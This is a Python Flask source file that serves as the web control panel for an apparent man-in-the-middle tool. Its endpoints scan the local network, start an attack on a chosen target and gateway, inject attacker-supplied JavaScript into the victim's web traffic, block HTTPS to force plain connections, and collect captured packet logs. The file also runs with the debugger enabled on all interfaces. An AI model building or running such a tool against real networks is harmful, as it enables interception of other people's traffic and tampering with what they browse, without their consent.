from flask import Flask, render_template, jsonify, request
from sniffer import NetworkSniffer
import threading
import time

import signal
import sys

# ... (imports)

app = Flask(__name__)
sniffer = NetworkSniffer()

def cleanup(signum, frame):
    """Handle exit signals to restore network."""
    print(f"\n[!] Caught signal {signum}. Cleaning up...")
    sniffer.stop_attack()
    sys.exit(0)

# Register signals (SIGINT=Ctrl+C, SIGTERM=Kill)
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)
# Handle SIGHUP (Terminal closed) if available
if hasattr(signal, 'SIGHUP'):
    signal.signal(signal.SIGHUP, cleanup)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan', methods=['POST'])
def scan_network():
    val = sniffer.scan_network()
    # Scapy scan returns list, let's wrap or just return
    return jsonify(val)

@app.route('/api/gateway')
def get_gateway():
    gateway = sniffer.get_default_gateway()
    return jsonify({"gateway_ip": gateway})

@app.route('/api/start', methods=['POST'])
def start_attack():
    data = request.json
    target_ip = data.get('target_ip')
    gateway_ip = data.get('gateway_ip')
    
    if not target_ip or not gateway_ip:
        return jsonify({"error": "Missing headers"}), 400
        
    result = sniffer.start_attack(target_ip, gateway_ip)
    if result:
        return jsonify({"status": "started", "target": target_ip})
    else:
        return jsonify({"error": "Already running or invalid target"}), 400

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    sniffer.stop_attack()
    return jsonify({"status": "stopped"})

@app.route('/api/injection', methods=['POST'])
def configure_injection():
    data = request.json
    enabled = data.get('enabled', False)
    code = data.get('code', "alert('Hacked!');")
    
    sniffer.proxy.set_injection_code(code)
    
    if sniffer.is_running:
        if enabled:
            sniffer.enable_redirection(sniffer.target_ip)
        else:
            sniffer.redir_active = False # Disable simple
            sniffer.apply_pf_rules(sniffer.target_ip, False, sniffer.block_https_active)
            
    return jsonify({"status": "updated", "enabled": enabled})

@app.route('/api/block_https', methods=['POST'])
def block_https():
    data = request.json
    enabled = data.get('enabled', False)
    
    if sniffer.is_running:
        sniffer.set_https_block(sniffer.target_ip, enabled)
            
    return jsonify({"status": "updated", "enabled": enabled})

@app.route('/api/logs')
def get_logs():
    return jsonify(sniffer.packet_logs)

@app.route('/api/status')
def get_status():
    return jsonify({
        "running": sniffer.is_running,
        "target": sniffer.target_ip
    })

if __name__ == '__main__':
    # Run Flask on port 5001 to avoid AirPlay conflict on macOS
    app.run(debug=True, host='0.0.0.0', port=5001)
